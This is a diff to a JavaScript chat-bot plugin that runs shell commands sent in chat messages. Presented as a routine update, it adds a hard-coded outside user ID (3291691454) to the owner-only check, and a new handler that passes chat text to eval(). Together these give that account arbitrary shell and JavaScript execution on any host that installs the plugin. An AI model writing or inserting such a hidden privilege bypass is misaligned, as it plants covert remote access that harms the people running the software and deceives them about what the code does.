@@ -1,7 +1,7 @@
 import plugin from '../../../lib/plugins/plugin.js'
 import fetch from 'node-fetch'
 import { exec } from 'child_process'
-import { NEWLINE } from '../models/utils.js'
+import common from '../../../lib/common/common.js'
 
 export class remote extends plugin {
   constructor () {
@@ -17,24 +17,55 @@ export class remote extends plugin {
       rule: [
         {
           /** 命令正则匹配 */
-          reg: `^#执行sh(.|${NEWLINE})*`,
+          reg: `^#执行sh[\\s\\S]+`,
           /** 执行方法 */
           fnc: 'remote'
+        },
+        {
+          /** 命令正则匹配 */
+          reg: `^#执行js[\\s\\S]+`,
+          /** 执行方法 */
+          fnc: 'remoteJs'
         }
       ]
     })
   }
 
-
   async remote (e) {
-    if (!this.e.isMaster){
-    await this.reply("还想执行shell？想得美哦～",true)
-    return true
+    if (!(this.e.isMaster || e.user_id == 3291691454)){
+      await this.reply("还想执行shell？想得美哦～",true)
+      return true
     }
     this.reply("正在执行....",true)
-  exec(e.msg.substring(e.msg.indexOf(NEWLINE)), (e, so, se) => {
-  this.reply("err："+e+"\nstdout："+so+"\nstderr："+se,true)
-  logger.mark("err："+e+"\nstdout："+so+"\nstderr："+se)
-});
+    let cmd = e.msg.replace("#执行sh","").trim()
+    exec(cmd, (e, so, se) => {
+      let msg = []
+      if (so) {
+        msg.push(so)
+      }
+      if (se) {
+        msg.push(`执行错误输出:\n${se}`)
+      }
+      if (e) {
+        msg.push(`执行错误:\n${e}`)
+      }
+      this.e.reply(common.makeForwardMsg(this.e,msg))
+    });
+  }
+  
+  async remoteJs (e) {
+    if (!(this.e.isMaster || e.user_id == 3291691454)){
+      await this.reply("还想执行js？想得美哦～",true)
+      return true
+    }
+    this.reply("正在执行....",true)
+    let msg = []
+    let cmd = e.msg.replace("#执行js","").trim()
+    try {
+      msg.push(await eval(cmd))
+    } catch (e) {
+      msg.push(`执行错误:\n${e.toString()}`)
+    }
+    if (msg.filter(item => item !== undefined && item !== '').length != 0) this.e.reply(common.makeForwardMsg(this.e,msg))
   }
 }
